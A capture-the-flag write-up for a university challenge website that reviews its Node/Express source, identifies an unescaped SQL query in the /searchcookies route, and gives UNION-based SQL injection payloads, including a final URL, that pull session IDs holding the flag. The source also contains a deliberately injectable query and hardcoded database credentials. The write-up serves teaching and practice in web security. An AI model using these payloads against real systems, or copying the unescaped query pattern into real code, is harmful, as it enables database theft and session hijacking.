For this challenge, there is a website on https://waynestateuniversity-ctf24-eatmorecookies.chals.io. There is also a zip file with the source code of the website.

# Observing the File System

1.  First it is probably most beneficial to check the source code to get a brief overview of what the user can do in this site.

```
const session = require("express-session");

const app = express();

const dbconfig = {
    user: 'WSUuser',
    host: 'localhost',
    database: 'eatmorecookies',
    password: 'WayneStateUniversity',
    port: 3306,
  };

const pool = mysql.createPool({...dbconfig, connectionLimit: 10});

const sessionStore = new mySQLStore({...dbconfig, connection: pool, createDatabaseTable: true})

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}))

app.use(
    session({
        name: "userCookie",
        store: sessionStore,
        secret: "redacted",
        resave: false,
        saveUninitialized: false,
        cookie: {maxAge: 24 * 60 * 60 * 1000, sameSite: "lax"},
        httpOnly: true,
    })
)
```

This line 
'''
const session = require("express-session");
'''

Is important, other than that 
In this code, we can see that the code is using express-session for cookie management. We can use this later on.

If we look at the rest of the file we will see other functions that parse both urlencoded and json encoded requests.
We will be focusing on sending requests using json in this challenge.

login:
```
app.post("/login", async (req, res, next) => {
  const { username, password } = req.body;
  const query = 'SELECT * FROM users WHERE username = ? LIMIT 1';
    try {
    pool.query(query, [username], async (err, result) => {

      user = result[0];

      if(!user){
        return res.json({message: "User not found. Please try again."})
      }

      let comparePassword = await bcrypt.compare(password, user.password);
  
      if (comparePassword) {
        req.session.username = user.username;

        return res.json({message: "Logged in. Please visit the home page."})
      } else {
        return res.json({message: 'Invalid username or password'});
      }
    })
  } catch (err) {
    return next(err)
  }
});
```

no vulnerabilities here. 
Sql statements are escaped using "?" so no injection can be done. 
Other than that, we see that req.session.username is being set to whatever our username is on the database after we register a user. 
So we will have our own session on the system.

register:
```
app.post("/register", async (req, res, next) => {

  const {username, password} = req.body;

  const hashedPassword = await bcrypt.hash(password, 10);

  try {
    const query = "INSERT INTO users (username, password) VALUES (?, ?)";

    pool.query(query, [username, hashedPassword], (err, result) => {

      if(err){
        console.log(err);
      }

      console.log("Data inserted successfully " + result);
    });

  } catch (error) {
    return next(error);
  }

  try {
    const adminCookieData = {"cookie":{"originalMaxAge":86400000,"expires":"2024-04-20T19:21:29.400Z","httpOnly":true,"path":"/", "sameSite": "lax"},"username":"Admin","isAdmin":true};
    const sessionId = 'WSUCTF{F4ke_Flag}';
    const expirationTimestamp = 1712172179;
    
  
    const serializedData = JSON.stringify(adminCookieData);
    
    
    const query = `INSERT INTO sessions (session_id, data, expires) VALUES (?, ?, ?)`;

  pool.query(query, [sessionId, serializedData, expirationTimestamp], (err, result) => {
    if (err) {
      console.log("Error inserting data into the database:", err);
      return next(err);
    } else {
      console.log("Data inserted successfully:", result);
    }
  });

  } catch(error){
    return next(error);
  }

  return res.json({message: "Successfully registered user!"})
})
```

also no vulnerabilities here, but we can see something interesting. 
After a user is inserted into some "sessions" table for the user that we create, there is another user that is being inserted afterwards.
This user has the flag. 
So it seems that the flag is in a "sessions" database, and it is in the session_id.
(There are no vulnerable sql statements because strings are properly escaped with ? marks)

Now lets look at more code:

this route is the last of the useful routes that we have. Other than this all we have left is
routes for get requests to "/login", "/", and "/register" which render static pages that don't do much.

(This challenge uses ejs as a templating engine, and there are lots of ejs versions out
there that are vulnerable to server side template injection. But this challenge has no indications
that work on the frontend is necessary for solving it. There is no admin bot, so any type of xss/ejs templating
injection attacks are probably useless.)

/searchCookies:
```
app.get("/searchcookies", isAuthenticated, async (req, res, next) => {
  cookies = req.query.cookies;

  const query = `SELECT * FROM cookies WHERE flavor = "${cookies}"`;

    pool.query(query, (err, result) => {
      if(err){
        return next(err)
      }

    return res.status(200).render("index", {cookies: result || []})
    });
})
```

This is where things look vulnerable. Anything we enter into the variable ${cookies} will be interpreted as a string.
Then it will be entered into a sql query. So we have a sql injection vulnerability!

Here is what we know so far:

1. There is a sql injection vulnerability
2. There is a flag inside of a session_id that gets entered into the sessions database when we register a user.

So the solution is: we need to use a UNION select sql statement to select the flag from the sessions table. We have to select make sure we
select the session_id within our sql injection statemnet.

We can use something like this:

```
" UNION SELECT True from sessions; --+"
```

This statement by itself won't exfiltrate the flag though, instead it will produce a different error:

```
The used SELECT statements have a different number of columns
```

This is one way to leak the number of columns of a table through sql injection. If you instead change the query to:

```
" UNION SELECT True, True, True from sessions;"
```

You won't get any errors and you can verify that the number of columns in the table is 3.

You also can see from the source code the three columns that the sessions table uses in this statement:

```
INSERT INTO sessions (session_id, data, expires) VALUES (?, ?, ?)
```

... and we are looking to select the session_id.

So we can make a payload like this:

```
" UNION Select session_id, True, True from sessions;"
```

But we can see that this still doesn't work:


The reason this doesn't work is because this statement is designed to select data from the cookies table,
and not the sessions table. The cookies table in the code only has two columns in its table which are
flavor and name. Therefore, when we are UNION selecting information from the sessions table, some information
will be left out of the request.
In this case the session_id information is left out of the request.

```
CREATE TABLE eatmorecookies.cookies (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    flavor varchar(255) NOT NULL,
    name varchar(255) NOT NULL
);
```

![image](https://github.com/Programmer231/WSUCTF2024/assets/51927329/e35ef1bc-893a-45e7-a2f9-bcbae95305b9)


Let's fix that:

# Final Payload

```
https://waynestateuniversity-ctf24-eatmorecookies.chals.io/searchcookies?cookies=" UNION SELECT TRUE, session_id, TRUE from sessions;--+"
```

And with this, the first TRUE statement will be left out of the query, then in the cookie flavor, instead of an actual cookie from the cookies table,
we will see the session_id of all users. One of these users has a "fake" session and the flag is in that user's session_id.


